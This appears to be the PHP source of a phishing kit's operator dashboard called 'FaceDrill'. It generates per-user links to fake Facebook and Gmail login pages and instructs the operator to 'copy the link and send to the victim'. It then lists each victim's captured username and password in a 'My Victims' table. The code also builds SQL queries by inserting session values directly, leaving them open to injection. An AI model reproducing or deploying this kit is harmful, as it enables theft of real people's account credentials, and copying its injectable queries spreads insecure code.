<?php
     error_reporting(0);
     session_start();
     $session=$_SESSION['id'];
     if(!isset($session)) {
          header("location: http://facedrill.ml/index.php");
     }else {
        require 'connect.inc.php';
        $q="SELECT name FROM users WHERE id='$session'";
        $exe=mysqli_query($conn,$q);
        $row=mysqli_fetch_array($exe);
     }
     $token=sha1($session);
     //facebook
     $url='http://facedrill.ml/services/facebook/desktop.php?'.$token."=Facebook";
     $q_1="INSERT INTO base (id,token,url) VALUES ('$session','$token','$url')";
     $run=mysqli_query($conn,$q_1);
     //gmail
     $url_gmail='http://facedrill.ml/services/gmail/index.php?'.$token."=Gmail";
     $q_2="INSERT INTO base (id,token,url) VALUES ('$session','$token','$url_gmail')";
     mysqli_query($conn,$q_2);
     //facebook
     $url_mobile='http://facedrill.ml/services/facebook/mobile.php?'.$token."=Mobile_Version";
     $q_3="INSERT INTO base (id,token,url) VALUES ('$session','$token','$url')";
     $run=mysqli_query($conn,$q_3);
     

?>
<!DOCTYPE HTML>
<html lang='en'>
    <head>
        <meta charset='UTF-8'/>
        <meta name='viewport' content='width=device-width'/>
        <title>Welcome to Face Drill</title>
        <link rel='stylesheet' href='http://facedrill.ml/cloth.css'/>
    </head>
    <body>
       <div class='custom'>
            <h1><img src=' facedrill.png' align='center' alt='facedrill'/></h1>
            <hr>
            <h1>Welcome <?php echo $row['name']; ?></h1>
            <font color='red'>
                <u>
                <h2><strong>copy the link and send to the victim</strong></h2>
                </u>
            </font>
            <table align='center' border='1px'>
            <tr>
                 <td><img src='facebook.jpg' height='200' /></td>
            </tr>
            <tr>
            <td align='center'>
                     <?php
                         echo "<form action='$url' method='GET'>";
                            echo "<input type='submit' value='Facebook' name='$token' class='button2'/>";
                         echo "</form>";
                     ?></br>
                      <?php
                         echo "<form action='$url_mobile' method='GET'>";
                            echo "<input type='submit' value='Mobile_Version' name='$token' class='button2'/>";
                         echo "</form>";
                     ?></td>
            </tr>
            <tr>
                <td><img src='gmail.png' align='center'/></td> 
            </tr>
            <tr>
                <td align='center'>
                     <?php
                         echo "<form action='$url_gmail' method='GET'>";
                            echo "<input type='submit' value='Gmail' name='$token' class='button2'/>";
                         echo "</form>";
                     ?>
                 </td>
            </tr>
            </table>
            <h4 align='center'>My Victims:</h2>
            <table align='center' border='1'>
                 
            </table>
            <?php
                 $list="SELECT vic_username,vic_password,service FROM victim WHERE id='$session'";
                 $exe2=mysqli_query($conn,$list);
                 if(!$exe2) {
                     echo "<font color='red'>Currently you have no victim</font>";
                 }else{
                     echo "<table align='center' cellpadding='4' class='decorate' border='1px' style='overflow-x:auto;'>";
                     echo "<tr>";
                     echo "<th>Website</th>";
                     echo "<th>Email/Phone</th>";
                     echo "<th>Password</th>";
                     echo "</tr>";

                     while($data=mysqli_fetch_array($exe2)) {
                         echo "<tr>";
                         echo "<td>".$data['service']."</td>";
                         echo "<td>".$data['vic_username']."</td>";
                         echo "<td>".$data['vic_password']."</td>";
                         echo "</tr>";
                    }
                    echo "</table>";
                 }
            ?>
            </br></br>
            <div align='center'>
    	        <form action='http://facedrill.ml/logout.php'>
    	             <input type='submit' class='button' value='Logout'/>
    	        </form>
    	    </div>
            <hr>
            <p>Copyright 2017 | FaceDrill</p>
            <p>Developed by <a href='http://facebook.com/ashut0shsingh'>Ashutosh Singh</a></p>
            <p><a href='http://facedrill.ml/about.php'>About</a></p>
      </div>
    </body>
</html>